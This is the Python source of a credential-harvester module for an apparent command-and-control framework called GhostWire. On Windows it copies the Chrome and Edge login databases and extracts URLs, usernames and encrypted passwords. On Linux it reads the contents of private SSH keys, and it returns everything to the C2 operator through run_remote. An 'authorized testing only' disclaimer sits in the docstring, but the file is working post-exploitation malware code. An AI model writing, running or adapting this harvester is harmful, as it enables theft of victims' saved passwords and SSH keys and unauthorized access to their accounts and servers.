"""
GhostWire Credential Harvester Module
====================================

This module implements credential harvesting techniques for extracting
sensitive authentication data from target systems. It focuses on common
credential storage locations and formats used by browsers and SSH.

Supported Credential Types:
- Browser credentials (Chrome, Edge on Windows)
- SSH private keys (Linux/macOS)
- System authentication data

Security Considerations:
- This module is for authorized testing only
- Extracted passwords may be encrypted and require additional tools
- SSH keys are displayed in truncated form for security
- Temporary files are cleaned up after extraction

Usage:
    module creds

Note: Browser password decryption requires platform-specific tools not
included in this module. The encrypted passwords are displayed in base64
format for further processing with appropriate decryption tools.
"""
import os
import shutil
import sqlite3
import base64
import platform
import subprocess
import io
import sys

class Creds:
    """
    Credential Harvester: Extracts credentials from browsers and SSH keys.
    
    This class provides methods for harvesting various types of credentials
    from different platforms. It implements safe extraction techniques that
    minimize impact on the target system.
    
    Usage: module creds
    """
    
    @staticmethod
    def _browser_creds_windows():
        """
        Extract browser credentials from Windows systems.
        
        This method targets common browser credential databases:
        - Google Chrome: Login Data database
        - Microsoft Edge: Login Data database
        
        The method copies the database to a temporary location to avoid
        file locking issues, then extracts credential information.
        
        Returns:
            str: Formatted output containing extracted credentials
        """
        # Get the local application data directory
        appdata = os.getenv('LOCALAPPDATA', '')
        
        # Define paths to browser credential databases
        browser_paths = {
            'Chrome': os.path.join(appdata, 'Google\\Chrome\\User Data\\Default\\Login Data'),
            'Edge': os.path.join(appdata, 'Microsoft\\Edge\\User Data\\Default\\Login Data')
        }
        
        output = ""
        
        # Process each browser's credential database
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                # Create temporary database file to avoid locking issues
                tmp_db = os.path.join(os.getenv('TEMP'), 'login_data.db')
                
                try:
                    # Copy the database to temporary location
                    shutil.copy2(path, tmp_db)
                    
                    # Connect to the temporary database
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    
                    # Query for stored credentials
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    output += f"[+] Credentials from {browser}:\n"
                    
                    # Process each credential entry
                    for row in cursor.fetchall():
                        url, user, pwd_encrypted = row
                        
                        # Only process entries with all required fields
                        if url and user and pwd_encrypted:
                            # Display URL and username in plain text
                            output += f"  URL: {url}\n"
                            output += f"  User: {user}\n"
                            # Display encrypted password in base64 (truncated for security)
                            output += f"  Encrypted Pass: {base64.b64encode(pwd_encrypted).decode()[:40]}...\n\n"
                    
                    # Clean up database connection
                    conn.close()
                    
                    # Remove temporary database file
                    os.remove(tmp_db)
                    
                except Exception as e:
                    output += f"[!] Failed to read {browser} credentials: {e}\n"
            else:
                output += f"[-] {browser} data not found.\n"
        
        return output

    @staticmethod
    def _keychain_linux():
        """
        Extract SSH keys from Linux systems.
        
        This method searches for SSH private keys in the user's .ssh directory.
        It displays the key contents in a truncated format to avoid exposing
        complete private keys in logs.
        
        Returns:
            str: Formatted output containing SSH key information
        """
        output = ""
        
        # Look for SSH directory in user's home directory
        ssh_dir = os.path.expanduser('~/.ssh')
        
        if os.path.exists(ssh_dir):
            output += "[+] Found SSH directory.\n"
            
            # List all files in the SSH directory
            for f in os.listdir(ssh_dir):
                # Look for private key files (start with 'id_' but not public keys)
                if 'id_' in f and not f.endswith('.pub'):
                    key_path = os.path.join(ssh_dir, f)
                    output += f"    - Found Private Key: {key_path}\n"
                    
                    try:
                        # Read and display the beginning of the private key
                        with open(key_path, 'r') as key_file:
                            key_content = key_file.read().strip()
                            # Display first 300 characters of the key
                            output += "      " + key_content.replace('\n', '\n      ')[:300] + "...\n"
                    except Exception:
                        output += "      (Could not read key file contents)\n"
        
        return output
    
    @staticmethod
    def run_remote(args):
        """
        Main entry point for the credential harvesting module.
        
        This method is called by the C2 framework when the module is executed.
        It determines the target platform and calls appropriate harvesting methods.
        
        Args:
            args: Command-line arguments (not used in this module)
            
        Returns:
            str: Complete output from credential harvesting operations
        """
        # Capture stdout to return as string
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Running Credential Harvester on {platform.system()}...")
            
            # Platform-specific credential harvesting
            if platform.system() == "Windows":
                print("\n--- Browser Credentials (Windows) ---")
                print("[!] Note: Passwords require platform-specific decryption not included in this module.")
                print(Creds._browser_creds_windows())
                
            elif platform.system() == "Linux":
                print("\n--- SSH Keys (Linux) ---")
                print(Creds._keychain_linux())
                
            else:
                print(f"[!] Unsupported OS for this module: {platform.system()}")
                
        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            # Restore stdout
            sys.stdout = old_stdout
            
        return captured_output.getvalue()